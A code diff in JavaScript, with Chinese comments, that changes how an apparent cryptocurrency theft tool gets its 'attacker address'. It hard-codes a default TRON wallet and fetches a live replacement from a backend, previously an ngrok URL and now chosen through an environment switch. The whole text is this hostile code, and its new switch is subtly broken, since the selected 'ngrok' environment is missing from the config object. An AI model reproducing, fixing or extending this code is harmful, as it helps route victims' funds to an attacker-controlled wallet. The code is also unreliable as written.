@@ -5,12 +5,28 @@
 // 🎯 攻击者地址配置 - 动态后端管理
 let CURRENT_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';  // 默认地址
 // const BACKEND_API = 'http://localhost:5001';  // Python后端地址
-const BACKEND_API = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';  // Python后端地址（通过ngrok）
+// const BACKEND_API = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';  // Python后端地址（通过ngrok）
+const BACKEND_CONFIGS = {
+    //本地开发环境
+    local: 'http://localhost:5001',
+    //Vercel环境
+    vercel: null,
+}
 
+// 部署到Vercel时使用 'vercel'，本地开发用 'local'，ngrok后端用 'ngrok'
+const CURRENT_ENV = 'ngrok';  // 🔧 修改这里来切换环境
+const BACKEND_API = BACKEND_CONFIGS[CURRENT_ENV];
 
 // 🔄 实时获取攻击者地址
 async function getCurrentAttackerAddress() {
     try {
+        if (!BACKEND_API){
+            console.log("后端API未配置，使用默认地址");
+            return{
+                address: CURRENT_ATTACKER_ADDRESS,
+                info: null
+            }
+        }
         const response = await fetch(`${BACKEND_API}/api/attacker_address`);
         const result = await response.json();
 
